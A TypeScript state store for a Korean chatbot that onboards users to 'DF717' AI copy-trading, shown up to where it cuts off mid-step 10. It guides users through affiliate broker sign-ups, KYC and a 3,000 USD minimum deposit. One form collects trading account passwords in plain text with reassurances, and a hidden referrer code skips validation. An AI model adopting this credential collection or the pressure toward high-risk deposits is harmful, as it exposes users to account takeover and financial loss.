import { create } from 'zustand';
import { persist } from 'zustand/middleware';
import { supabase } from '@/integrations/supabase/client';
import { Message, MessageGroup, UserData, ChatState } from './types';

interface ChatStore extends ChatState {
  locale: string;
  addMessage: (message: Message) => void;
  addMessageGroup: (messages: Message[]) => void;
  setCurrentStep: (step: number) => void;
  updateUserData: (data: Partial<UserData>) => void;
  resetChat: () => void;
  initializeChat: () => void;
  proceedToStep: (step: number) => void;
  updateFormField: (messageId: string, fieldId: string, value: string) => void;
  submitUserForm: (messageId: string) => void;
  submitPersonalInfoForm: (messageId: string) => void;
  showPersonalInfoForm: () => void;
  showAccountTypeSelection: () => void;
  selectAccountType: (type: 'demo' | 'live') => void;
  skipToAccountForm: () => void;
  setProcessing: (processing: boolean) => void;
  executedSteps: Set<number>;
  isStepExecuted: (step: number) => boolean;
  markStepExecuted: (step: number) => void;
}

const initialUserData: UserData = {
  firstName: '',
  lastName: '',
  email: '',
  phone: '',
  accountId: '',
  password: '',
  server: '',
};

const initialMessages: Message[] = [];

export const useChatStore = create<ChatStore>()(
  persist(
    (set, get) => ({
      messages: initialMessages,
      messageGroups: [],
      currentStep: 0,
      userData: initialUserData,
      isProcessing: false,
      executedSteps: new Set<number>(),
      locale: 'ko',

      addMessage: (message: Message) => {
        set((state) => {
          const messageExists = state.messages.some(m => m.id === message.id);
          if (messageExists) {
            return state;
          }
          return {
            messages: [...state.messages, message]
          };
        });
      },

      addMessageGroup: (messages: Message[]) => {
        const groupId = `group-${Date.now()}`;
        const messageGroup: MessageGroup = {
          id: groupId,
          messages: messages.map(msg => ({ ...msg, groupId })),
          timestamp: new Date()
        };
        
        set((state) => ({
          messages: [...state.messages, ...messageGroup.messages],
          messageGroups: [...state.messageGroups, messageGroup]
        }));
      },

      isStepExecuted: (step: number) => {
        return get().executedSteps.has(step);
      },

      markStepExecuted: (step: number) => {
        set((state) => ({
          executedSteps: new Set([...state.executedSteps, step])
        }));
      },

      setCurrentStep: (step: number) => {
        set({ currentStep: step });
      },

      updateUserData: (data: Partial<UserData>) => {
        set((state) => ({
          userData: { ...state.userData, ...data }
        }));
      },

      setProcessing: (processing: boolean) => {
        set({ isProcessing: processing });
      },

      resetChat: () => {
        set({
          messages: initialMessages,
          messageGroups: [],
          currentStep: 0,
          userData: initialUserData,
          isProcessing: false,
          executedSteps: new Set<number>(),
          locale: 'ko',
        });
      },

      initializeChat: () => {
        const state = get();
        
        // Locale mismatch check - reset if wrong locale persisted
        if (state.locale !== 'ko' && state.messages.length > 0) {
          console.log('Locale mismatch detected, resetting...');
          get().resetChat();
          return;
        }
        
        // Skip if already initialized
        if (state.messages.length > 0 || state.isStepExecuted(0)) {
          console.log('Chat already initialized, skipping');
          return;
        }
        
        const sessionId = crypto.getRandomValues(new Uint32Array(1))[0].toString(36);
        console.log('Chat initialized with sessionId:', sessionId);
        
        get().markStepExecuted(0);
        
        set((state) => ({
          userData: { ...state.userData, sessionId },
          locale: 'ko'
        }));
        
        setTimeout(() => {
          get().addMessage({
            id: 'welcome-1',
            content: '안녕하세요! DF717에 오신 걸 환영해요! 😊',
            sender: 'ai',
            type: 'text',
            timestamp: new Date(),
            animate: false,
          });
          
          setTimeout(() => {
            get().addMessage({
              id: 'welcome-2',
              content: '지금부터 단 3분이면 AI 자동투자를 시작하실 수 있어요.',
              sender: 'ai',
              type: 'text',
              timestamp: new Date(),
              animate: false,
            });
            
          setTimeout(() => {
            get().showAccountTypeSelection();
          }, 800);
          }, 800);
        }, 500);
      },

      showAccountTypeSelection: () => {
        get().addMessage({
          id: 'account-type-question',
          content: '어떤 방식으로 AI 자동투자를 시작하시겠어요?',
          sender: 'ai',
          type: 'text',
          timestamp: new Date(),
          animate: false,
        });

        setTimeout(() => {
          get().addMessage({
            id: 'account-type-selection',
            content: '',
            sender: 'ai',
            type: 'action_button',
            timestamp: new Date(),
            animate: false,
            buttons: [
              {
                label: '📊 체험해보기',
                description: '무료 데모계좌로 안전하게 체험',
                type: 'card',
                action: () => {
                  get().selectAccountType('demo');
                }
              },
              {
                label: '💰 바로 시작하기',
                description: '실제 자금으로 바로 투자 시작',
                type: 'card',
                action: () => {
                  get().selectAccountType('live');
                }
              }
            ]
          });
        }, 800);
      },

      selectAccountType: (type: 'demo' | 'live') => {
        set((state) => ({
          userData: { ...state.userData, accountType: type }
        }));

        const typeText = type === 'demo' ? '📊 체험해보기' : '💰 바로 시작하기';
        get().addMessage({
          id: `user-account-type-${Date.now()}`,
          content: typeText,
          sender: 'user',
          type: 'text',
          timestamp: new Date(),
          animate: false
        });

        setTimeout(() => {
          get().addMessage({
            id: 'personal-info-request',
            content: '맞춤형 가이드와 프로그램 시작 알림을 위해 간단한 정보를 알려주실 수 있나요?',
            sender: 'ai',
            type: 'text',
            timestamp: new Date(),
            animate: false,
          });
          
          setTimeout(() => {
            get().showPersonalInfoForm();
          }, 800);
        }, 800);
      },

      showPersonalInfoForm: () => {
        get().addMessage({
          id: 'personal-info-form',
          content: '',
          sender: 'ai',
          type: 'form',
          timestamp: new Date(),
          animate: false,
          formFields: [
            {
              id: 'userName',
              label: '이름',
              type: 'text',
              placeholder: '이름을 입력하세요',
              required: true,
              value: ''
            },
            {
              id: 'email',
              label: '이메일',
              type: 'email',
              placeholder: '이메일을 입력하세요',
              required: true,
              value: ''
            },
            {
              id: 'phone',
              label: '연락처',
              type: 'tel',
              placeholder: '연락처를 입력하세요',
              required: true,
              value: ''
            },
            {
              id: 'referrerName',
              label: '추천인 (선택사항)',
              type: 'text',
              placeholder: '추천인 이름을 입력하세요',
              required: false,
              value: ''
            }
          ],
          buttons: [
            {
              label: '시작하기',
              type: 'primary',
              action: () => {
                get().submitPersonalInfoForm('personal-info-form');
              }
            }
          ]
        });
      },

      submitPersonalInfoForm: (messageId: string) => {
        const { messages, isProcessing } = get();
        
        if (isProcessing) return;
        
        set({ isProcessing: true });
        
        const formMessage = messages.find(m => m.id === messageId);
        
        if (formMessage && formMessage.formFields) {
          const userName = formMessage.formFields.find(f => f.id === 'userName')?.value || '';
          const email = formMessage.formFields.find(f => f.id === 'email')?.value || '';
          const phone = formMessage.formFields.find(f => f.id === 'phone')?.value || '';
          const referrerName = formMessage.formFields.find(f => f.id === 'referrerName')?.value || '';

          // Developer skip mode - bypass validation and database storage
          if (referrerName.toLowerCase() === 'df') {
            const dummyPersonalData = {
              firstName: '개발자',
              email: 'dev@test.com',
              phone: '010-0000-0000',
              referrerName: '',
              sessionId: crypto.getRandomValues(new Uint32Array(1))[0].toString(36)
            };
            
            get().updateUserData(dummyPersonalData);
            
            get().addMessage({
              id: `personalized-greeting-${Date.now()}`,
              content: `${dummyPersonalData.firstName}님을 위한 맞춤 가이드를 시작할 준비가 완료되었어요.`,
              sender: 'ai',
              type: 'text',
              timestamp: new Date(),
              animate: false
            });

            setTimeout(() => {
              const { userData } = get();
              const brokerName = userData.accountType === 'live' ? 'Vantage' : 'ICMarkets';
              
              get().addMessage({
                id: `step-intro-message-${Date.now()}`,
                content: `첫 번째로, ${brokerName}에서 계좌 신청을 해볼게요.`,
                sender: 'ai',
                type: 'text',
                timestamp: new Date(),
                animate: false
              });

              setTimeout(() => {
                set({ isProcessing: false });
                get().proceedToStep(1);
              }, 1000);
            }, 800);
            
            return; // Skip all validation and database storage
          }

          if (!userName.trim()) {
            get().addMessage({
              id: `validation-error-${Date.now()}`,
              content: '⚠️ **이름을 입력해주세요.**',
              sender: 'ai',
              type: 'warning_box',
              timestamp: new Date(),
              animate: false
            });
            set({ isProcessing: false });
            return;
          }

          if (!email.trim()) {
            get().addMessage({
              id: `validation-error-${Date.now()}`,
              content: '⚠️ **이메일을 입력해주세요.**',
              sender: 'ai',
              type: 'warning_box',
              timestamp: new Date(),
              animate: false
            });
            set({ isProcessing: false });
            return;
          }

          const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
          if (!emailRegex.test(email)) {
            get().addMessage({
              id: `validation-error-${Date.now()}`,
              content: '⚠️ **올바른 이메일 형식을 입력해주세요.**',
              sender: 'ai',
              type: 'warning_box',
              timestamp: new Date(),
              animate: false
            });
            set({ isProcessing: false });
            return;
          }

          if (!phone.trim()) {
            get().addMessage({
              id: `validation-error-${Date.now()}`,
              content: '⚠️ **연락처를 입력해주세요.**',
              sender: 'ai',
              type: 'warning_box',
              timestamp: new Date(),
              animate: false
            });
            set({ isProcessing: false });
            return;
          }

          const phoneRegex = /^01[0-9]-?[0-9]{4}-?[0-9]{4}$/;
          if (!phoneRegex.test(phone.replace(/[\s-]/g, ''))) {
            get().addMessage({
              id: `validation-error-${Date.now()}`,
              content: '⚠️ **올바른 연락처 형식을 입력해주세요. (예: 010-1234-5678)**',
              sender: 'ai',
              type: 'warning_box',
              timestamp: new Date(),
              animate: false
            });
            set({ isProcessing: false });
            return;
          }

          const savePersonalInfo = async () => {
            try {
              const sessionId = crypto.getRandomValues(new Uint32Array(1))[0].toString(36);
              set((state) => ({
                userData: { ...state.userData, sessionId }
              }));
              console.log('Personal info captured, session_id:', sessionId);
            } catch (error) {
              console.error('Personal info capture error:', error);
            }
          };

          savePersonalInfo();

          set((state) => ({
            userData: { 
              ...state.userData, 
              firstName: userName, 
              email: email,
              phone: phone,
              referrerName 
            }
          }));

          setTimeout(() => {
            get().addMessage({
              id: `personalized-greeting-${Date.now()}`,
              content: `${userName}님을 위한 맞춤 가이드를 시작할 준비가 완료되었어요.`,
              sender: 'ai',
              type: 'text',
              timestamp: new Date(),
              animate: false
            });

            setTimeout(() => {
              const { userData } = get();
              const brokerName = userData.accountType === 'live' ? 'Vantage' : 'ICMarkets';
              
              get().addMessage({
                id: `step-intro-message-${Date.now()}`,
                content: `첫 번째로, ${brokerName}에서 계좌 신청을 해볼게요.`,
                sender: 'ai',
                type: 'text',
                timestamp: new Date(),
                animate: false
              });

              setTimeout(() => {
                set({ isProcessing: false });
                get().proceedToStep(1);
              }, 1000);
            }, 800);
          }, 800);
        } else {
          set({ isProcessing: false });
        }
      },

      skipToAccountForm: () => {
        const { isProcessing } = get();
        
        if (isProcessing) return;
        
        set({ isProcessing: true });
        
        // Add user message acknowledging skip
        get().addMessage({
          id: `user-skip-${Date.now()}`,
          content: '이미 계좌가 있습니다',
          sender: 'user',
          type: 'text',
          timestamp: new Date(),
          animate: false
        });

        // Add account information form messages directly
        setTimeout(() => {
          get().addMessageGroup([
            {
              id: 'skip-step-6-intro',
              content: 'AI 자동투자 프로그램 시작을 위해 계좌 정보를 입력해주세요',
              sender: 'ai',
              type: 'text',
              timestamp: new Date(),
              animate: false,
            },
            {
              id: 'skip-step-6-account-info',
              content: '📋 **입력할 정보:**\n\n• **Account ID** (계좌번호)\n• **Password** (비밀번호)\n• **Server** (서버명)',
              sender: 'ai',
              type: 'info_box',
              timestamp: new Date(),
              animate: false,
            },
            {
              id: 'skip-step-6-security',
              content: '🔒 **안심하세요!**\n브로커 홈페이지 로그인 정보와 거래 계좌 정보는 **완전히 다른 거**예요.\n계좌 정보는 **AI 프로그램 연동에만** 사용됩니다.',
              sender: 'ai',
              type: 'warning_box',
              timestamp: new Date(),
              animate: false,
            },
            {
              id: 'skip-step-6-form',
              content: '',
              sender: 'ai',
              type: 'form',
              timestamp: new Date(),
              animate: false,
              formFields: [
                {
                  id: 'accountId',
                  label: 'Account ID',
                  type: 'tel',
                  placeholder: '계좌번호를 입력하세요',
                  required: true,
                  value: ''
                },
                {
                  id: 'password',
                  label: 'Password',
                  type: 'text',
                  placeholder: '계좌 비밀번호를 입력하세요',
                  required: true,
                  value: ''
                },
                {
                  id: 'server',
                  label: 'Server',
                  type: 'text',
                  placeholder: '서버명을 입력하세요',
                  required: true,
                  value: ''
                }
              ],
              buttons: [
                {
                  label: '프로그램 시작 요청하기',
                  type: 'primary',
                  action: () => {
                    get().submitUserForm('skip-step-6-form');
                  }
                }
              ]
            }
          ]);

          set({ 
            isProcessing: false,
            currentStep: 6
          });
        }, 800);
      },

      proceedToStep: (step: number) => {
        const { isProcessing, isStepExecuted } = get();
        
        console.log(`Attempting to proceed to step ${step}, isProcessing: ${isProcessing}, isStepExecuted: ${isStepExecuted(step)}`);
        
        if (isProcessing || isStepExecuted(step)) {
          console.log(`Step ${step} blocked - isProcessing: ${isProcessing}, isStepExecuted: ${isStepExecuted(step)}`);
          return;
        }
        
        set({ isProcessing: true });
        get().markStepExecuted(step);
        
        console.log(`Proceeding to step ${step}`);

        setTimeout(() => {
          switch (step) {
            case 1: {
              const { userData } = get();
              const isDemo = userData.accountType === 'demo';
              const brokerUrl = isDemo 
                ? 'https://www.icmarkets.com/global/ko/open-trading-account/demo/?camp=83293'
                : 'https://www.vantagemarkets.com/ko/open-live-account/?affid=NjEwNDAyODc0';

              get().addMessageGroup([
                {
                  id: 'step-1-title',
                  content: '1단계: 계좌 신청하기',
                  sender: 'ai',
                  type: 'text',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-1-info',
                  content: `💡 **브로커란?**\n주식거래를 하기 위해 증권사에 계좌를 개설하거나, 코인거래를 하기 위해 거래소에 가입하는 것처럼, CFD거래를 위해서도 이런 중개 플랫폼이 필요해요. 그 중에서도 Vantage는 전 세계 트레이더들에게 신뢰받고 있는 글로벌 브로커예요.\n\n아래 정보를 정확히 입력해주세요:\n\n✓ **거주지**: Republic of Korea (대한민국)\n✓ **이메일 주소**: 실제 사용하는 이메일 입력\n✓ **비밀번호**: 8~16자, 대소문자/숫자/특수문자 조합 필수\n✓ **계정 유형 선택**: 개인 / 회사 중 해당 항목 선택\n✓ **약관 동의** 체크박스 확인 및 선택\n\n입력 완료 후 **라이브 계정 오픈하기** 버튼을 클릭해주세요.`,
                  sender: 'ai',
                  type: 'info_box',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-1-action',
                  content: '',
                  sender: 'ai',
                  type: 'text',
                  timestamp: new Date(),
                  animate: false,
                  buttons: [
                    {
                      label: 'Vantage 실계좌 신청 홈페이지 열기 →',
                      type: 'link',
                      action: () => {
                        window.open(brokerUrl, '_blank');
                      }
                    }
                  ]
                },
                {
                  id: 'step-1-complete',
                  content: '',
                  sender: 'ai',
                  type: 'action_button',
                  timestamp: new Date(),
                  animate: false,
                  buttons: [
                    {
                      label: '계좌 신청을 완료했어요',
                      type: 'primary',
                      action: () => {
                        get().addMessage({
                          id: `user-response-${Date.now()}`,
                          content: '계좌 신청을 완료했어요',
                          sender: 'user',
                          type: 'text',
                          timestamp: new Date(),
                          animate: false
                        });
                        
                        setTimeout(() => {
                          get().proceedToStep(2);
                        }, 800);
                      }
                    }
                  ]
                }
              ]);
              
              set({ currentStep: 1, isProcessing: false });
              break;
            }

            case 2: {
              get().addMessageGroup([
                {
                  id: 'step-2-title',
                  content: '2단계: 이메일 인증',
                  sender: 'ai',
                  type: 'text',
                  timestamp: new Date(),
                  animate: true,
                },
                {
                  id: 'step-2-intro',
                  content: '잘하셨어요!\n\n이제 추가 본인 인증 절차를 진행해 볼게요.',
                  sender: 'ai',
                  type: 'text',
                  timestamp: new Date(),
                  animate: true,
                },
                {
                  id: 'step-2-email',
                  content: `1. 입력한 이메일로 **OTP 보내기** 버튼을 클릭하세요.\n\n2. 받은메일함에서 **인증 코드**를 확인하세요.\n\n3. 해당 이메일 인증 코드를 입력 후 **제출**버튼을 눌러주세요.`,
                  sender: 'ai',
                  type: 'info_box',
                  timestamp: new Date(),
                  animate: true,
                },
                {
                  id: 'step-2-tip',
                  content: `💡 **Tip!**\n받은메일함에 안 보일 경우 **스팸메일함**을 확인해주세요.`,
                  sender: 'ai',
                  type: 'warning_box',
                  timestamp: new Date(),
                  animate: true,
                },
                {
                  id: 'step-2-action',
                  content: '',
                  sender: 'ai',
                  type: 'action_button',
                  timestamp: new Date(),
                  animate: true,
                  buttons: [
                    {
                      label: '이메일 인증을 완료했어요',
                      type: 'primary',
                      action: () => {
                        get().addMessage({
                          id: `user-response-${Date.now()}`,
                          content: '이메일 인증을 완료했어요',
                          sender: 'user',
                          type: 'text',
                          timestamp: new Date(),
                          animate: false
                        });
                        
                        setTimeout(() => {
                          get().proceedToStep(3);
                        }, 800);
                      }
                    }
                  ]
                }
              ]);
              
              set({ currentStep: 2, isProcessing: false });
              break;
            }

            case 3: {
              get().addMessageGroup([
                {
                  id: 'step-3-title',
                  content: '3단계: 휴대폰 인증',
                  sender: 'ai',
                  type: 'text',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-3-intro',
                  content: '본인 확인을 위해 휴대폰 인증을 진행합니다.',
                  sender: 'ai',
                  type: 'text',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-3-info',
                  content: '1. 국가코드(한국 +82)를 선택한 후 전화번호를 입력하세요.\n\n2. **OTP 보내기** 버튼을 클릭하세요.\n\n3. 문자메시지로 받은 인증 코드를 입력한 후 **제출**버튼을 눌러주세요.',
                  sender: 'ai',
                  type: 'info_box',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-3-tip',
                  content: '💡 **Tip!**\n문자메시지가 안 올 경우 **차단된(스팸) 메시지**를 확인해주세요.',
                  sender: 'ai',
                  type: 'warning_box',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-3-action',
                  content: '',
                  sender: 'ai',
                  type: 'action_button',
                  timestamp: new Date(),
                  animate: false,
                  buttons: [
                    {
                      label: '휴대폰 인증을 완료했어요',
                      type: 'primary',
                      action: () => {
                        get().addMessage({
                          id: `user-response-${Date.now()}`,
                          content: '휴대폰 인증을 완료했어요',
                          sender: 'user',
                          type: 'text',
                          timestamp: new Date(),
                          animate: false
                        });
                        
                        setTimeout(() => {
                          get().proceedToStep(4);
                        }, 800);
                      }
                    }
                  ]
                }
              ]);
              
              set({ currentStep: 3, isProcessing: false });
              break;
            }

            case 4: {
              get().addMessageGroup([
                {
                  id: 'step-4-title',
                  content: '4단계: 개인정보 입력',
                  sender: 'ai',
                  type: 'text',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-4-intro',
                  content: '아래 정보를 입력해주세요:',
                  sender: 'ai',
                  type: 'text',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-4-info',
                  content: '✓ **이름, 성, 성별** (여권 기준 영문)\n✓ **생년월일** (일/월/년 순서)\n✓ **주요 거주국가, 국적**: 대한민국',
                  sender: 'ai',
                  type: 'info_box',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-4-warning',
                  content: '⚠️ **중요!**\n**모든 정보는 여권 기준으로 작성**해야 해요.\n잘못된 영문 이름 입력시 KYC 본인 인증\n및 출금이 지연될 수 있습니다.\n예시) 김자동 → First Name: Jadong, Last Name: Kim\n\n**계속** 버튼을 클릭하세요.',
                  sender: 'ai',
                  type: 'warning_box',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-4-action',
                  content: '',
                  sender: 'ai',
                  type: 'action_button',
                  timestamp: new Date(),
                  animate: false,
                  buttons: [
                    {
                      label: '개인정보 입력을 완료했어요',
                      type: 'primary',
                      action: () => {
                        get().addMessage({
                          id: `user-response-${Date.now()}`,
                          content: '개인정보 입력을 완료했어요',
                          sender: 'user',
                          type: 'text',
                          timestamp: new Date(),
                          animate: false
                        });
                        
                        setTimeout(() => {
                          get().proceedToStep(5);
                        }, 800);
                      }
                    }
                  ]
                }
              ]);
              
              set({ currentStep: 4, isProcessing: false });
              break;
            }

            case 5: {
              get().addMessageGroup([
                {
                  id: 'step-5-title',
                  content: '5단계: 신분 인증 (KYC Verification)',
                  sender: 'ai',
                  type: 'text',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-5-intro',
                  content: '실거래 기능을 사용하기 위해 신분 인증을 진행합니다.',
                  sender: 'ai',
                  type: 'text',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-5-what',
                  content: '💡 **신분 인증이란?**\n신분 인증을 통해 **보증금, 출금, 입금 한도**가 해제됩니다.',
                  sender: 'ai',
                  type: 'info_box',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-5-docs',
                  content: '📋 **인증 가능한 신분증 유형**\n- 운전면허증\n- ID 카드/주민등록증\n- 거주 카드/외국인 등록증\n- 여권',
                  sender: 'ai',
                  type: 'info_box',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-5-steps',
                  content: '1. 개인정보 처리방침 및 동의 항목을 읽고 확인합니다.\n\n2. "내 개인 데이터 처리에 동의합니다" 체크 후 **계속** 버튼을 클릭하세요.\n\n3. 이름, 성, 국적, 생년월일을 입력 후 계속 버튼을 클릭하세요. (이미 입력한 경우 자동 표시 됩니다.)\n\n4. 인증할 신분증의 유형을 선택한 후 계속 버튼을 클릭하세요.\n\n5. 신분증의 **앞면/뒷면 사진 업로드한 후 계속 버튼을 클릭하세요. (여권은 메인 정보 페이지를 올리면 됩니다.)',
                  sender: 'ai',
                  type: 'text',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-5-warning',
                  content: '⚠️ **주의!**\n**정보 불일치, 흐릿한 사진, 조명 반사** 등은 인증 실패 원인이 될 수 있으니 주의해주세요.',
                  sender: 'ai',
                  type: 'warning_box',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-5-action',
                  content: '',
                  sender: 'ai',
                  type: 'action_button',
                  timestamp: new Date(),
                  animate: false,
                  buttons: [
                    {
                      label: '신원 확인 서류를 업로드했어요',
                      type: 'primary',
                      action: () => {
                        get().addMessage({
                          id: `user-response-${Date.now()}`,
                          content: '신원 확인 서류를 업로드했어요',
                          sender: 'user',
                          type: 'text',
                          timestamp: new Date(),
                          animate: false
                        });
                        
                        setTimeout(() => {
                          get().proceedToStep(6);
                        }, 800);
                      }
                    }
                  ]
                }
              ]);
              
              set({ currentStep: 5, isProcessing: false });
              break;
            }

            case 6: {
              get().addMessageGroup([
                {
                  id: 'step-6-title',
                  content: '6단계: 거래 계좌 개설',
                  sender: 'ai',
                  type: 'text',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-6-intro',
                  content: '거래 시작 준비가 거의 완료되었습니다.\n\n보증금, 출금, 입금 한도가 해제된 **계정 설정**을 진행할 거에요.',
                  sender: 'ai',
                  type: 'text',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-6-settings',
                  content: '아래 항목을 정확히 선택해주세요:\n\n**거래 플랫폼**: 메타트레이더 5 (첫 계좌 개설 시에는 변경 불가)\n\n**계좌 유형**: RAW ECN\n\n**계좌 통화**: USD\n\n**V-Wallet 연결**: 체크 (암호화폐 입출금 사용 가능)\n\n**제출** 후 설정 완료 메시지를 확인하세요.',
                  sender: 'ai',
                  type: 'info_box',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-6-note',
                  content: '💡 **참고!**\n최초 생성되는 실거래 계좌는 **메타트레이더 5(MT5) 플랫폼**으로 자동 설정됩니다.\n이후 **MT4 계좌, Copy Trading 전용 계좌**를 추가 개설할 수 있습니다.',
                  sender: 'ai',
                  type: 'warning_box',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-6-action',
                  content: '',
                  sender: 'ai',
                  type: 'action_button',
                  timestamp: new Date(),
                  animate: false,
                  buttons: [
                    {
                      label: '거래 계좌 개설을 완료했어요',
                      type: 'primary',
                      action: () => {
                        get().addMessage({
                          id: `user-response-${Date.now()}`,
                          content: '거래 계좌 개설을 완료했어요',
                          sender: 'user',
                          type: 'text',
                          timestamp: new Date(),
                          animate: false
                        });
                        
                        setTimeout(() => {
                          get().proceedToStep(7);
                        }, 800);
                      }
                    }
                  ]
                }
              ]);
              
              set({ currentStep: 6, isProcessing: false });
              break;
            }

            case 7: {
              get().addMessageGroup([
                {
                  id: 'step-7-title',
                  content: '7단계: Vantage 앱 설치',
                  sender: 'ai',
                  type: 'text',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-7-intro',
                  content: 'Copy Trading을 진행하기 위해 Vantage 앱이 필요해요.',
                  sender: 'ai',
                  type: 'text',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-7-info',
                  content: '📱 앱스토어 또는 구글 플레이에서 **"Vantage"** 앱을 검색 후 설치합니다.\n\n설치 완료 후 앱을 실행해주세요.',
                  sender: 'ai',
                  type: 'info_box',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-7-warning',
                  content: '⚠️ **중요!**\n**반드시 앱으로 진행**되어야 합니다.',
                  sender: 'ai',
                  type: 'warning_box',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-7-downloads',
                  content: '',
                  sender: 'ai',
                  type: 'text',
                  timestamp: new Date(),
                  animate: false,
                  buttons: [
                    {
                      label: 'Vantage 안드로이드 앱 다운로드 →',
                      type: 'link',
                      action: () => {
                        window.open('https://play.google.com/store/apps/details?id=cn.com.vau', '_blank');
                      }
                    },
                    {
                      label: 'Vantage 아이폰 앱 다운로드 →',
                      type: 'link',
                      action: () => {
                        window.open('https://apps.apple.com/kr/app/vantage-all-in-one-trading-app/id1457929724', '_blank');
                      }
                    }
                  ]
                },
                {
                  id: 'step-7-action',
                  content: '',
                  sender: 'ai',
                  type: 'action_button',
                  timestamp: new Date(),
                  animate: false,
                  buttons: [
                    {
                      label: '앱 설치를 완료했어요',
                      type: 'primary',
                      action: () => {
                        get().addMessage({
                          id: `user-response-${Date.now()}`,
                          content: '앱 설치를 완료했어요',
                          sender: 'user',
                          type: 'text',
                          timestamp: new Date(),
                          animate: false
                        });
                        
                        setTimeout(() => {
                          get().proceedToStep(8);
                        }, 800);
                      }
                    }
                  ]
                }
              ]);
              
              set({ currentStep: 7, isProcessing: false });
              break;
            }

            case 8: {
              get().addMessageGroup([
                {
                  id: 'step-8-title',
                  content: '8단계: 로그인하기',
                  sender: 'ai',
                  type: 'text',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-8-intro',
                  content: '좋아요! 이제 Vantage에 로그인해볼게요.',
                  sender: 'ai',
                  type: 'text',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-8-info',
                  content: '🔐 방금 가입하신 이메일과 비밀번호로 로그인해주세요.',
                  sender: 'ai',
                  type: 'info_box',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-8-action',
                  content: '',
                  sender: 'ai',
                  type: 'action_button',
                  timestamp: new Date(),
                  animate: false,
                  buttons: [
                    {
                      label: '로그인했어요',
                      type: 'primary',
                      action: () => {
                        get().addMessage({
                          id: `user-response-${Date.now()}`,
                          content: '로그인했어요',
                          sender: 'user',
                          type: 'text',
                          timestamp: new Date(),
                          animate: false
                        });
                        
                        setTimeout(() => {
                          get().proceedToStep(9);
                        }, 800);
                      }
                    }
                  ]
                }
              ]);
              
              set({ currentStep: 8, isProcessing: false });
              break;
            }

            case 9: {
              get().addMessageGroup([
                {
                  id: 'step-9-title',
                  content: '9단계: Copy Trading 계좌 개설',
                  sender: 'ai',
                  type: 'text',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-9-intro',
                  content: '카피 트레이딩을 사용하려면 **별도의 전용 계좌**를 먼저 개설해야 합니다.',
                  sender: 'ai',
                  type: 'text',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-9-note',
                  content: '💡 **참고!**\n계좌는 일반 거래계좌와 별도로 **카피트레이딩 전용**입니다.',
                  sender: 'ai',
                  type: 'info_box',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-9-steps',
                  content: '📱 **Vantage 앱에서:**\n1. 상단의 Live 00000000 계좌번호 클릭\n2. 계정관리 섹션 하단의 "실계좌 추가" 클릭\n3. 동명계좌 개설 페이지에서 아래 설정 확인',
                  sender: 'ai',
                  type: 'text',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-9-settings',
                  content: '📋 **계좌 설정:**\n- **계정 플랫폼**: Copy Trading\n- **계정 유형**: ECN\n- **계정 통화**: USD\n\n개인선언문 동의 후 **제출** 버튼을 클릭하세요.',
                  sender: 'ai',
                  type: 'info_box',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-9-action',
                  content: '',
                  sender: 'ai',
                  type: 'action_button',
                  timestamp: new Date(),
                  animate: false,
                  buttons: [
                    {
                      label: 'Copy Trading 계좌를 개설했어요',
                      type: 'primary',
                      action: () => {
                        get().addMessage({
                          id: `user-response-${Date.now()}`,
                          content: 'Copy Trading 계좌를 개설했어요',
                          sender: 'user',
                          type: 'text',
                          timestamp: new Date(),
                          animate: false
                        });
                        
                        setTimeout(() => {
                          get().proceedToStep(10);
                        }, 800);
                      }
                    }
                  ]
                }
              ]);
              
              set({ currentStep: 9, isProcessing: false });
              break;
            }

            case 10: {
              get().addMessageGroup([
                {
                  id: 'step-10-title',
                  content: '10단계: 투자금 입금',
                  sender: 'ai',
                  type: 'text',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-10-intro',
                  content: '카피트레이딩을 시작하려면 계좌에 자금을 먼저 입금해야 합니다.',
                  sender: 'ai',
                  type: 'text',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-10-minimum',
                  content: '💰 **DF717 최소 투자금**: 3,000.00 USD 이상',
                  sender: 'ai',
                  type: 'info_box',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-10-warning',
                  content: '⚠️ **입금 전 확인!**\n반드시 **"Copy Trading 계좌"**를 선택해주세요.',
                  sender: 'ai',
                  type: 'warning_box',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-10-steps',
